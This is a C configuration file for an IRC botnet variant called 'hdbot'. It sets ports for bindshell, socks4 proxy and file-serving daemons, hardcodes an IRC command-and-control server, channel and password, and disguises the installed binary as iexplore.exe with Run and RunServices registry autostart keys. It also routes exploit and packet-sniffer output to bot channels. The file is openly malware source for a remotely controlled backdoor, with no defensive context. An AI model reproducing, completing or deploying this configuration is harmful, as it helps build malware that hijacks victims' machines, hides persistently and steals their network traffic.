// bot configuration (generic) - doesn't need to be encrypted
int port = 8888;				// server port
int port2 = 8889;				// backup server port
int socks4port = 31337;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;			// Port # for tftp daemon to run on
int ftpport = brandom(1337,65535); 	// Port # for ftpd daemon to run on
int httpport = 34000;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
unsigned short bindport = 4460;		// Port # for bindshell daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\windows\\system32\\reconfg.ocx";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "hdbot";						// bot id
char version[] = "[\x03\x34\2hdbotv0.1\2\x03 v3.1]";		// Bots !version reply
char password[] = "pass";					// bot password
char server[] = "irc.cyber-terror.com";		// server
char serverpass[] = "";						// server password
char channel[] = "#hdbot";				// channel that the bot should join
char chanpass[] = "hdbot";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "iexplore.exe";			// destination file name
char valuename[] = "INTERNET EXPLORER";		// value name for autostart
char nickconst[] = "HD|";					// first part to the bot's nick
char szLocalPayloadFile[]="iexplore.exe";	// Payload filename
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#hdbot";					// Channel where exploit messages get redirected
char psniffchan[] = "#hdbot-sniff";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@*0.1.0.1"
};

char *versionlist[] = {
"eggdrop v1.6.15",
"eggdrop v1.6.14",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
